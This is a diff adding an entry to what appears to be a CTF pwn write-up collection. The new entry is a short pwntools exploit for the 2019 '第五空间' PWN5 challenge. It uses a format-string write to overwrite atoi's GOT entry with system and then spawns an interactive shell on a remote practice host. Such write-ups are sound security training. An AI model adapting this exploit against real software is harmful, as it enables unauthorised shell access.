@@ -818,5 +818,25 @@ icon: icon-html
 * ### TWCTF_online_2019_asterisk_alloc
 
   略
+  
+* ### [第五空间2019 决赛]PWN5
+
+  ```python
+  from pwn import *
+  r = remote('node2.buuoj.cn.wetolink.com',28850)
+  elf = ELF('./pwn')
+  offset = 10
+  system_plt = elf.plt['system']
+  read_got = elf.got['read']
+  atio_got = elf.got['atoi']
+  payload = fmtstr_payload(offset,{atio_got:system_plt})
+  r.sendline(payload)
+  r.recvuntil('your passwd:')
+  r.sendline('/bin/sh\x00')
+  r.interactive()
+  
+  ```
+
+  
 
 
